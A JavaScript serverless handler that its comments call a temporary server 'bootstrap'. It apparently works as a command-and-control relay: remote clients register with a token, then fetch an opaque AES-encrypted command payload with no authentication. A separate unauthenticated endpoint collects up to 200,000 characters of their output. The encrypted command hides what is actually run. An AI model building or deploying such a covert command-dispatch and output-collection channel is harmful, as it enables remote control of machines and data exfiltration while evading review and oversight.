import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '5';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+CMhvUM2/zxhPoOgXAdqS43bpaKNKFYifK60OxA64hOLIYvepNwmm+ANLLyHZEBkY4g/ipkwFMVTnx37fdTr7VvSyjgvOMWhcylykKZTetrP26nWzAeYZHtMaLcTnxQWoxInoe7+V1YPSQW3ff5YJVdSvUc5moW9ydFkHjT1GCcWFFbwakOp15ayZ35CL0RgswAyC4mSIfI4fHmkE/FoHGbOyuHNLS/u8yyQeKbAkKPw0ns7TJT7wiYSuFPkxsyCchtNU1BJeH4eAMJILNNj/CyFWthIc5CFCVPNpOmGp7XPdZZLwFboEWigj5T1DIJIomjAf6VpR9Bq3vWdLBnY41cwqCJf/LCPiuOhzDc+nXP1qbD9dI+v42V+5TRpJlBb0O9+2XrRfDUpx2gD/TF57yskziFeM2SAGN9SxEKWg9jUWROBBfirWsSbQzvFL/wDaFLQpEBcFLYmGIUYp0OuvskVVpydIZYhQCil1/looBSR72XIZiA0OAyS64MVgzsLEY9OR0M+7Akq3MAo5V/8W7vgqnPzMttVAbabzTCddehuVYL1p1oHlFzU6OczboW02wWVW2aeO5+tR/sTT+MGk4NQ+6tOkPIMNN0iIRE+FF467XZQthD9qc8WJ2ocOaob3byPivEWNFkwQJlDrr6GBbZiOuGIvUkBOsmKmXMJD7VszNxquqg+5/z+4elzpFDP4QISSqzLbEB0nVNsvrpKQnYwlYMHyRu/CaFbmatYdkF134wjTbWC7WcsIeGiMYddZVo+ly3lWWaFkBWtuUlV2OC9gtZsLVnRUHTCwpK6uMSbeVx+9wYPfYQYUg+m+OCn6ZjB23CWkR3BB6roo2Fa1qpnFdb4qYB0+WlhuxQGsmFgtjd07M3DdUhseyQAw6JIhTrLojTgHjX4TFo+yKBauKV/W19836g44fLahNUn04GqYCEa7Xis/S';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
